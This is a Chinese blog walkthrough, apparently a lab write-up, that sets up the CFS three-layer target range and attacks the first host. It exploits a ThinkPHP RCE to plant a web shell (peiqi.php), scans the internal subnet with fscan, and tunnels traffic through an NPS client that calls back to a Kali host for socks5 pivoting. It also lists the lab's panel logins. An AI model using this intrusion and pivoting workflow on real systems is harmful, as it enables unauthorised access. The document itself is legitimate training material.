<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hello</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="环境搭建 下载靶机 本次实验环境借助teamssix的一个CFS三层的靶机，靶机下载地址如下  1234【CFS三层靶机环境】百度网盘链接：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LJueA-X02K7HZXr8QsOmeg提取码: dkcp解压密码：teamssix.com  下载下来是一些7z文件，直接解压第一个文件CFS三层靶机环境.7z.001到当前目录 解压后得到靶机目">
<meta property="og:type" content="article">
<meta property="og:title" content="Hello">
<meta property="og:url" content="http://example.com/2024/10/06/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83/index.html">
<meta property="og:site_name" content="Hello">
<meta property="og:description" content="环境搭建 下载靶机 本次实验环境借助teamssix的一个CFS三层的靶机，靶机下载地址如下  1234【CFS三层靶机环境】百度网盘链接：链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LJueA-X02K7HZXr8QsOmeg提取码: dkcp解压密码：teamssix.com  下载下来是一些7z文件，直接解压第一个文件CFS三层靶机环境.7z.001到当前目录 解压后得到靶机目">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496179381-3df5ef7d-ae0a-4662-88e4-361ab770e243.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496326286-cc6697e2-562d-4373-bca6-b2b4a09674e5.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720497458901-fa787b0a-9101-4a01-8519-8539dd3bf6e1.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496385821-0656eeca-c28f-472e-98ba-810e8ed53283.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496435381-1463425e-2d2d-477b-915a-e45a534fc717.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496479551-6ad8b607-534d-4096-b098-284e878b5391.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496547939-538f3682-4167-4a80-8dc8-6276ad2fba83.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496718849-77a39a3b-93d2-441e-82ee-ad7ca9f58ecd.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727871258049-fd2714f3-1242-45be-8cd9-71790f9f0e20.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727871728186-58d32766-ac9a-4e81-9570-289109276264.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872032411-2ffdf015-be03-43bd-bd44-7824abab627a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872186424-471d7caa-1bd9-4f32-bd55-a9f79f3b57e1.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/jpeg/32730265/1727936170108-990ba7c2-f6a3-49f8-8651-8a82a6edb795.jpeg">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872574297-33531d03-9ad2-447d-b83c-14359fd83991.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872719561-9fdfb483-7d77-49f8-b692-1e2a48f49903.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872687980-55488077-272a-42a9-8621-1ac4e28d7d21.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872745281-d1eaf408-3356-46ff-a796-16e148e9bee0.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720508512443-6582e403-3d67-4a8e-83ac-cec35b7c1f9d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872844690-16b6f717-94ed-4a9d-89ac-5c56f39649e3.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872956987-f418c538-231c-4e5e-9ebf-dbbf583810be.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727873042232-cb7f3549-49b2-493c-840c-4080f82a5bbb.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727873138012-b103913b-7cef-4d03-bd9e-34d447b659e2.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913595713-1fea1149-32f7-4e83-9da7-1199ed4b6ab4.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913710415-92258a04-92cf-46db-8117-2e168bb83d20.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913778866-7ac00255-2b88-49ef-9abc-56ff21bc9a82.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913908045-a88f6e15-8afe-4732-8207-a0c3326909bd.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913920885-3dc17c29-e9ec-4f65-8f0e-fdf6123d5f90.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914075034-fdf64870-b647-4a59-b6f6-d336d01254aa.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914374319-dbed41fc-dd27-44c3-a7e8-18443d79d4dd.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914669510-5036576b-46ad-4903-8a6c-f92a5467793e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914812177-de4576f4-af15-43e7-bd42-778ea382e679.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915073518-8b1ce0db-07af-40e5-bc2f-6f5073362870.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914929432-48d6e85d-f26e-4f27-88d2-60ba763f377e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915839613-441f9fda-7caa-4082-8db3-7da366ee1915.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915891230-0c6a30cb-c370-43ac-af44-7ee15485ee07.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727916938420-09838082-41cb-4a3f-b90a-93889c563d38.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727916970432-4089131b-6caa-447d-bad9-46f193347af0.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917068313-ca55edc4-3245-4785-9731-8b749968613c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917060356-b1a9777e-4218-4c79-9d6c-52193d79514a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917558159-34a8da13-5026-4a7d-b093-a310e62772b7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917955366-8addf678-843f-41a4-9715-33409cd2383d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918124362-e4e9ab5e-f2af-491d-8efa-1fdeb2d3c349.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918243912-9675fd70-9082-418d-a478-6027e294f329.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919552655-1ef4e35f-d4ca-4916-a411-4121fa18f2cb.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919583566-fd7d54a3-cdb1-4d36-9a37-2b8e702f1c02.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920036262-4d9c8639-1a66-4280-b2bd-78c1b9b9d171.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727918483275-41d35b09-722a-4587-9295-7fbe85a05fc7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919047036-2b1e0eb0-399d-4dec-86be-50bca7f5d2c9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727919062192-702f552b-5bd1-4442-a6c3-0d7366e402c9.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920178224-ff3883f4-1613-4191-a820-cf3b0960c3b7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920568311-c42cac59-d1f1-4d56-9742-2dc53c1f4598.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920827337-6545d9d0-78f9-4400-843c-e6267382bae7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927608264-7dcdeede-69c8-4aa6-9729-0eb9b60142d5.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727920961761-c5a98bf1-7d98-4884-85a9-f7eb66b3073e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921100040-491acd4a-4549-4cb0-b9b8-a2c3c210d14f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921287343-7dfcb436-d204-4bdb-aed1-601fc00f7b8d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921756890-1b0e3e43-4231-4e6a-83ab-081766bc9d6c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727921798358-07bf3bce-fcc3-4713-ab9f-1c377765adb5.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727923124312-bfb1b6ed-bba7-409d-833c-f387f06d6e45.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924208280-ee6b0104-63e1-433a-8945-e1e634b574f7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727926761435-4de56c32-84ad-4985-b647-f25034a61597.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727926989293-922ae1e9-8be3-4866-84ee-fc6b028ca8ae.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927072739-be334ef1-95f8-4ab7-b037-421f5f0de86c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927179555-a9e363a4-5bf7-4f16-a07f-dd770a9bf0f7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927389775-e5af5609-a3b6-48b2-999c-7ec441d3ff89.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927430748-0efa56ce-949c-41d5-a9d8-b0ee5868628c.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727927516504-00a6d6fd-c828-48d2-8710-ed08d4fbd19f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924818428-f6f05cff-717c-4fad-91ce-09772793a70d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727924960079-0dfefd06-de1f-48ab-822f-3c113b8cec5e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925013448-a5be3868-b2ba-4310-b01d-78c0a359512a.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925578285-d23e040b-cfb8-4479-9a3d-6d6405abb50f.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925614281-31be5e61-1d24-4436-afb5-9118c634386d.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727925836567-c0afcd6d-6889-4401-ae3e-b6d93cdfcff0.png">
<meta property="article:published_time" content="2024-10-06T12:34:44.526Z">
<meta property="article:modified_time" content="2024-10-06T12:34:44.670Z">
<meta property="article:author" content="suhaynn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496179381-3df5ef7d-ae0a-4662-88e4-361ab770e243.png">
  
    <link rel="alternate" href="/atom.xml" title="Hello" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hello</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-CFS三层靶机环境" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/06/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83/" class="article-date">
  <time class="dt-published" datetime="2024-10-06T12:34:44.526Z" itemprop="datePublished">2024-10-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="agDGb">环境搭建</h1>
<h2 id="d4nX3">下载靶机</h2>
<font style="color:rgb(51, 51, 51);">本次实验环境借助teamssix的一个CFS三层的靶机，靶机下载地址如下</font>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【CFS三层靶机环境】百度网盘链接：</span><br><span class="line">链接: https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</span><br><span class="line">提取码: dkcp</span><br><span class="line">解压密码：teamssix.com</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(51, 51, 51);">下载下来是一些7z文件，直接解压第一个文件CFS三层靶机环境.7z.001到当前目录</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496179381-3df5ef7d-ae0a-4662-88e4-361ab770e243.png"><font style="color:rgb(51, 51, 51);">解压后得到靶机目录：CFS三层靶机环境，进去之后是三台靶机和一个使用说明</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496326286-cc6697e2-562d-4373-bca6-b2b4a09674e5.png"></p>
<p>他说让先配置网卡再导入靶机，我已经提前导入了，无所谓了，待会儿修改一下就行了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720497458901-fa787b0a-9101-4a01-8519-8539dd3bf6e1.png"></p>
<h2 id="IEpz1">导入靶机</h2>
虚拟机就以他们靶机名字来命名，同时也保存到相应靶机目录即可

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496385821-0656eeca-c28f-472e-98ba-810e8ed53283.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496435381-1463425e-2d2d-477b-915a-e45a534fc717.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496479551-6ad8b607-534d-4096-b098-284e878b5391.png"></p>
<p>提示我内存不够了，我去清理了一下</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496547939-538f3682-4167-4a80-8dc8-6276ad2fba83.png"></p>
<p>导完之后的样子</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720496718849-77a39a3b-93d2-441e-82ee-ad7ca9f58ecd.png"></p>
<h2 id="WFSdB">配置网卡</h2>
<font style="color:rgb(51, 51, 51);">模拟内外网环境，VMnet8 仅主机来模拟外网网卡，同时我们的kali也是该网卡</font>

<p><font style="color:rgb(51, 51, 51);">两张内网网卡是VMnet9和VMnet10，子网地址呢用官方默认的分别是192.168.22.0，192.168.33.0</font></p>
<p><font style="color:rgb(51, 51, 51);">在这里踩了坑，仅主机模式的网卡9和10需要把主机连接给关掉哈</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727871258049-fd2714f3-1242-45be-8cd9-71790f9f0e20.png"></p>
<p>Target1_CentOS7_64位</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727871728186-58d32766-ac9a-4e81-9570-289109276264.png"></p>
<p>Target2_Ubuntu_64位</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872032411-2ffdf015-be03-43bd-bd44-7824abab627a.png"></p>
<p>Target3_Windows7_64</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872186424-471d7caa-1bd9-4f32-bd55-a9f79f3b57e1.png"></p>
<p><font style="color:rgb(51, 51, 51);">网络拓扑图如下（子网掩码都为24位）</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32730265/1727936170108-990ba7c2-f6a3-49f8-8651-8a82a6edb795.jpeg" alt="画板"></p>
<h2 id="Xanp5">配置宝塔</h2>
<h3 id="RrEjJ">配置Target1_CentOS7_64位的宝塔信息</h3>
<font style="color:rgb(51, 51, 51);">先登录宝塔，地址：</font>http://192.168.1.128:8888/a768f1	09/<font style="color:rgb(51, 51, 51);">  账号：eaj3yhsl密码：41bb8fee</font>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872574297-33531d03-9ad2-447d-b83c-14359fd83991.png"></p>
<p>然后将靶机IP添加进去，这里边192.168.1.11是官方原版靶机的外网IP，这里替换成自己现在的IP即可，这样才能用我们当前的192.168.1.128外网IP访问到我们对应资源</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872719561-9fdfb483-7d77-49f8-b692-1e2a48f49903.png"></p>
<p>添加之前访问，显示未找到对应站点</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872687980-55488077-272a-42a9-8621-1ac4e28d7d21.png"></p>
<p>添加之后，就可以正常访问了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872745281-d1eaf408-3356-46ff-a796-16e148e9bee0.png"></p>
<h3 id="bWNDF">配置Target2_Ubuntu_64位的宝塔信息</h3>
还需要给Target2_Ubuntu_64位配置一下宝塔，网上我也没看到教程怎么配，我是这样处理的，再给靶机2配置一张外网网卡，通过外网网卡配置完宝塔之后，再把该网卡删掉，这样环境才算齐全

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1720508512443-6582e403-3d67-4a8e-83ac-cec35b7c1f9d.png"></p>
<p>先登录ubuntu看一下IP，可以看的内网靶机Target2_Ubuntu_64位的ip是192.168.22.128和192.168.33.128</p>
<p>根据提示应该是登录<a target="_blank" rel="noopener" href="http://192.168.22.129:8888/2cc52ec0/%E6%9D%A5%E9%85%8D%E7%BD%AE%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E7%94%B1%E4%BA%8E%E4%BB%96%E5%9C%A8%E5%86%85%E7%BD%91%EF%BC%8C%E7%BD%91%E4%B8%8A%E4%B9%9F%E6%B2%A1%E5%8F%AB%E6%95%99%E6%80%8E%E4%B9%88%E9%85%8D%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E5%B0%B1%E9%80%9A%E8%BF%87%E5%A4%9A%E9%85%8D%E7%BD%AE%E4%B8%80%E5%BC%A0%E5%A4%96%E7%BD%91%E7%BD%91%E5%8D%A1%E6%9D%A5%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E5%92%8C%E9%85%8D%E7%BD%AE">http://192.168.22.129:8888/2cc52ec0/来配置的，但是由于他在内网，网上也没叫教怎么配，所以我就通过多配置一张外网网卡来进行访问和配置</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872844690-16b6f717-94ed-4a9d-89ac-5c56f39649e3.png"></p>
<p>用刚配的外网IP登录宝塔</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.129:8888/2cc52ec0/">http://192.168.1.129:8888/2cc52ec0/</a> 账号：xdynr37d 密码：123qwe..</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727872956987-f418c538-231c-4e5e-9ebf-dbbf583810be.png"></p>
<p>同样配置一下，可以看到官方默认内网靶机Target2_Ubuntu_64位的IP是192.168.22.22，可现在IP变成192.168.22.128了。所以我们把192.168.22.128加进去</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727873042232-cb7f3549-49b2-493c-840c-4080f82a5bbb.png"></p>
<p>都加进去之后呢，把内网靶机Target2_Ubuntu_64位刚刚加的外网网卡给删掉，这样一个完整的内网靶场就建好啦。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727873138012-b103913b-7cef-4d03-bd9e-34d447b659e2.png"></p>
<h2 id="LAoHs">查看靶机信息</h2>
现在上帝视角统计一下已知信息吧

<h3 id="AbmC2">Target1_CentOS7_64位：</h3>
root密码：teamssix.com

<p>此主机的IP地址（这里IP是我们登录后看到的，属于作弊哈，实际上具体的IP需要后期信息搜集才能知道）：</p>
<p>192.168.1.128</p>
<p>192.168.22.129</p>
<p>宝塔后台登陆地址及密码：</p>
<p>地址：<a target="_blank" rel="noopener" href="http://192.168.1.128:8888/a768f109/">http://192.168.1.128:8888/a768f109/</a></p>
<p>账号：eaj3yhsl</p>
<p>密码：41bb8fee</p>
<h3 id="RhCr8">Target2_Ubuntu_64位：</h3>
root密码：teamssix.com

<p>此主机的IP地址（这里IP是我们登录后看到的，属于作弊哈，实际上具体的IP需要后期信息搜集才能知道）：</p>
<p>192.168.22.128</p>
<p>192.168.33.128</p>
<p>宝塔后台登陆地址及密码：</p>
<p>地址：<a target="_blank" rel="noopener" href="http://192.168.22.128:8888/2cc52ec0/">http://192.168.22.128:8888/2cc52ec0/</a></p>
<p>账号：xdynr37d</p>
<p>密码：123qwe..</p>
<h3 id="kiFM5">Target3_Windows7_64</h3>
Administrator密码：teamssix.com

<p>此主机的IP地址（这里IP是我们登录后看到的，属于作弊哈，实际上具体的IP需要后期信息搜集才能知道）：</p>
<p>192.168.33.33</p>
<h1 id="Egbwe">启动靶机</h1>
打靶时候我们只有一个Centos的外网IP哈，信息搜集吧。

<h2 id="KQIxk">靶机Target1的信息搜集</h2>
<h3 id="IIjlM">fscan漏扫</h3>
![](https://cdn.nlark.com/yuque/0/2024/png/32730265/1727873529669-77441f1b-ee47-4b42-b7b4-b1442f2535a6.png)

<p>得到了靶机的地址，192.168.1.1258，开放了21，22，80，3306，8888，888端口，同时扫出来存在Thinkphp的两个RCE，待会儿验证是否存在</p>
<p>先访问一下80端口是什么</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913595713-1fea1149-32f7-4e83-9da7-1199ed4b6ab4.png"></p>
<p>发现确实是ThinkPHP V5框架，这里偷懒，直接拿Thinkphp漏扫工具扫一下</p>
<h3 id="lhJ1r">Thinkphp漏扫</h3>
![](https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913671610-a1bd7822-773c-491f-8e95-64a9a3f904c5.png)

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913710415-92258a04-92cf-46db-8117-2e168bb83d20.png"></p>
<p>确实存在漏洞，直接利用漏扫工具一键getshell</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913778866-7ac00255-2b88-49ef-9abc-56ff21bc9a82.png"></p>
<h3 id="B1Ufx">蚁剑连接shell</h3>
用·1蚁剑连接上边获取到的shell，[http://192.168.1.128/peiqi.php](http://192.168.1.128/peiqi.php)   Pass:peiqi

<p>发现flag1</p>
<p>flag{e2D3aFdasde}</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913908045-a88f6e15-8afe-4732-8207-a0c3326909bd.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727913920885-3dc17c29-e9ec-4f65-8f0e-fdf6123d5f90.png"></p>
<h2 id="Z7KhQ">靶机Target1内网信息搜集</h2>
<h3 id="gRgD4">查看网段情况</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914075034-fdf64870-b647-4a59-b6f6-d336d01254aa.png"></p>
<p>发现存在两张网卡，192.168.1.0&#x2F;24和192.168.22.0&#x2F;24，其中192.168.1.0&#x2F;24是我们的外网网卡</p>
<h3 id="sklbG">探测出网情况</h3>
基于DNS协议命令：nslookup、dig、ping

<p>基于http协议命令：curl</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914374319-dbed41fc-dd27-44c3-a7e8-18443d79d4dd.png"></p>
<p>发现是出网的，很好，现在还想看看192.168.22.0&#x2F;24网段的都存在那些靶机</p>
<h3 id="U1oLX">上传fscan探测内网情况</h3>
![](https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914601767-c621e7e7-aa7e-4585-bb54-34a90a2ff6db.png)

<p>赋予执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x fscan</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914669510-5036576b-46ad-4903-8a6c-f92a5467793e.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.22.0/24</span><br></pre></td></tr></table></figure>

<p>扫完的结果会保存在当前目录的result.txt里</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914812177-de4576f4-af15-43e7-bd42-778ea382e679.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915073518-8b1ce0db-07af-40e5-bc2f-6f5073362870.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727914929432-48d6e85d-f26e-4f27-88d2-60ba763f377e.png"></p>
<p>结果发现内网存在第二个主机Target2 192.168.22.128，开放端口21，22，80，3306，888，8888，其中显示呢80端口存在<font style="color:rgb(0, 0, 0);"> BageCMS</font></p>
<p><font style="color:rgb(0, 0, 0);">现在我们对这个CMS是感兴趣的，想访问一下这个CMS，看看他的版本信息在网上找找有没有对应的的漏洞，这时就需要把第二个网段192.168.22.0&#x2F;24的流量通过Target1代理出来</font></p>
<h2 id="BDcoJ"><font style="color:rgb(0, 0, 0);">第二层代理</font></h2>
<font style="color:rgb(0, 0, 0);">我习惯使用NPS在靶机出网情况下进行代理，因为他具有十分友好的图形化界面，出网情况下还可以使用MSF，CS，Frp，iox等等做代理，其中frp用的应该是最多的</font>

<p><font style="color:rgb(0, 0, 0);">首先将NPS对应的linux NPC客户端上传到目标靶机中，用蚁剑上传</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915839613-441f9fda-7caa-4082-8db3-7da366ee1915.png"></p>
<p>赋予执行权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> + npc</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727915891230-0c6a30cb-c370-43ac-af44-7ee15485ee07.png"></p>
<h3 id="O5Cgo">NPS服务端新建客户端</h3>
本次就以kali 192.168.1.131当做我现实环境的VPS使用了

<p>Basic用户名密码本次就不设置了，下边的唯一验证密钥是在客户端中唯一的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727916938420-09838082-41cb-4a3f-b90a-93889c563d38.png"></p>
<p>同时记住这个客户端ID</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727916970432-4089131b-6caa-447d-bad9-46f193347af0.png"></p>
<p>在我们的客户端，也就是我们的靶机Target1中，进行TCP连接</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917068313-ca55edc4-3245-4785-9731-8b749968613c.png"></p>
<p>可以看到已经上线了</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917060356-b1a9777e-4218-4c79-9d6c-52193d79514a.png"></p>
<p>此时我们的VPS已经有了和靶机1的会话，现在建立一个socks5代理出来，将流量代理到本地</p>
<h3 id="bAtFN">新建Socks5代理</h3>
模式就选socks5代理

<p>客户端ID就是我们刚刚让记住的也就是上线的客户端ID</p>
<p>服务端端口就是我们本地进行socks5连接时候要用到的端口，这个端口不要被占用哈</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32730265/1727917558159-34a8da13-5026-4a7d-b093-a310e62772b7.png"></p>
<h3 id="CRmtn">连接代理</h3>
